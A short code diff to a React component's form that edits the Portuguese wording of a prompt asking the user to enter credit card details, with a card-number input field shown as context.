@@ -47,7 +47,7 @@ export class SocialProfiles extends Component {
 
 <img className="logo" src={logo} width="100"/>
 </div>
-                <p className="container"><b>Tudo certo!<br></br></b> Precisamos Cadastrar algumas informações do seu <b>cartão de crédito</b></p>
+                <p className="container"><b>Tudo certo!<br></br></b> Precisamos Cadastrar informações do seu <b>Cartão de Crédito</b></p>
                 <div className="form-group">
                     <input placeholder="16 dígitos do cartão" type="number" className="form-control" name="cc" onChange={inputChange('cc')} value={values.cc} required/>
                 </div>
